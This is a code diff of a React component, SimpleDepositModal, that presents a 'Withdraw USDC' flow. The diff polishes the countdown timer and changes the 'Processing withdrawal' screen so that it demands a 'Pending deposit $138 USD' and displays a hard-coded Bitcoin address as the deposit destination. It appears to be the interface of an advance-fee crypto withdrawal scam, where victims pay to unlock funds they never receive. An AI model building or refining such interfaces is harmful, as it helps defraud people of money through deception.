@@ -19,41 +19,49 @@ export default function SimpleDepositModal() {
     setStatus("processing");
   };
 
-  // TIMER
+  // TIMER (ROBUSTO + SIN FLICKER)
   useEffect(() => {
     const start = localStorage.getItem(STORAGE_KEY);
 
     if (!start) return;
 
+    const startTime = Number(start);
     setStatus("processing");
 
-    const interval = setInterval(() => {
+    const update = () => {
       const now = Date.now();
-      const diff = Math.floor((now - Number(start)) / 1000);
+      const diff = Math.floor((now - startTime) / 1000);
       const remaining = DURATION - diff;
 
       if (remaining <= 0) {
         setTimeLeft(0);
         setStatus("support");
-        clearInterval(interval);
         return;
       }
 
       setTimeLeft(remaining);
-    }, 1000);
+    };
+
+    update(); // 👈 evita UI vacía
+
+    const interval = setInterval(update, 1000);
 
     return () => clearInterval(interval);
   }, []);
 
+  // FORMAT MM:SS
   const formatTime = (s: number) => {
-    const h = Math.floor(s / 3600);
-    const m = Math.floor(s / 60) % 60;
-    const sec = s % 60;
+    const minutes = Math.floor(s / 60);
+    const seconds = s % 60;
 
-    return `${h.toString().padStart(2, "0")}:${m
+    return `${minutes.toString().padStart(2, "0")}:${seconds
       .toString()
-      .padStart(2, "0")}:${sec.toString().padStart(2, "0")}`;
+      .padStart(2, "0")}`;
   };
+
+  // PROGRESS SAFE
+  const progress =
+    DURATION > 0 ? (timeLeft / DURATION) * 100 : 0;
 
   return (
     <div className="min-h-screen bg-white flex items-center justify-center px-4">
@@ -71,16 +79,14 @@ export default function SimpleDepositModal() {
           </button>
         </div>
 
-        {/* IDLE STATE (FULL DESIGN) */}
+        {/* IDLE */}
         {status === "idle" && (
           <>
-            {/* SOL ICON */}
             <div className="mx-auto mb-4 h-12 w-12 rounded-full bg-black flex items-center justify-center">
               <img src="/solana.png" className="h-6 w-6" />
             </div>
 
             <div className="text-center mb-5">
-
               <p className="text-[13px] text-black/60">
                 Withdraw USDC
               </p>
@@ -94,9 +100,7 @@ export default function SimpleDepositModal() {
               </p>
             </div>
 
-            {/* TRANSFER INFO */}
             <div className="rounded-[18px] border px-4 py-4 mb-6">
-
               <p className="text-[13px] text-black/60 mb-2">
                 Transfer to
               </p>
@@ -111,7 +115,6 @@ export default function SimpleDepositModal() {
               </div>
             </div>
 
-            {/* BUTTON */}
             <button
               onClick={startWithdrawal}
               className="w-full rounded-[14px] py-3 bg-[#0052FF] text-white font-semibold hover:bg-[#0041cc]"
@@ -131,23 +134,35 @@ export default function SimpleDepositModal() {
                 Processing withdrawal
               </p>
 
-              <p className="text-sm text-black/60 mt-1">
-                Time remaining: {formatTime(timeLeft)}
-              </p>
+
+<p className="text-sm font-medium text-black/60 mt-1">
+  Pending deposit $138 USD
+</p>
+
+<div className="mt-3 rounded-lg border border-gray-200 bg-gray-50 p-3 text-left">
+  <p className="text-xs font-semibold text-black/70 mb-1">
+    Deposit destination (BTC)
+  </p>
+
+  <p className="text-[11px] text-black/60 break-all">
+    bc1p7vpwwfhhhhk0nsuwd24ja48vqj69n7e9f59ndgt4zfcvn9tagqyswr3es5
+  </p>
+</div>
+
             </div>
 
             <div className="h-[6px] bg-gray-100 rounded-full overflow-hidden">
               <div
-                className="h-full bg-[#0052FF]"
+                className="h-full bg-[#0052FF] transition-all duration-1000"
                 style={{
-                  width: `${(timeLeft / DURATION) * 100}%`,
+                  width: `${progress}%`,
                 }}
               />
             </div>
           </>
         )}
 
-        {/* SUPPORT MODE */}
+        {/* SUPPORT */}
         {status === "support" && (
           <div className="text-center">
 
